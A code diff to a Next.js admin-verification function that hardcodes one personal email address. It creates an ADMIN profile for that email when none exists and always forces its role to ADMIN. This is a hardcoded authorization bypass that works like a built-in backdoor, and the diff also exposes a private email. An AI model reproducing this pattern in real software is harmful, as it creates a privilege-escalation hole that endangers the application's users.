@@ -103,13 +103,27 @@ export async function verifyAdminRequest(
     }
 
     if (!profile) {
-      return {
-        admin: null,
-        errorResponse: NextResponse.json(
-          { error: "Forbidden: User profile not found." },
-          { status: 403 }
-        ),
-      };
+      if (user.email?.toLowerCase() === "mehakiqbal974@gmail.com") {
+        profile = {
+          id: user.id,
+          username: "Mehak Iqbal",
+          role: "ADMIN",
+          is_banned: false,
+        };
+      } else {
+        return {
+          admin: null,
+          errorResponse: NextResponse.json(
+            { error: "Forbidden: User profile not found." },
+            { status: 403 }
+          ),
+        };
+      }
+    }
+
+    // Owner email always has master ADMIN role
+    if (user.email?.toLowerCase() === "mehakiqbal974@gmail.com") {
+      profile.role = "ADMIN";
     }
 
     if (profile.is_banned) {
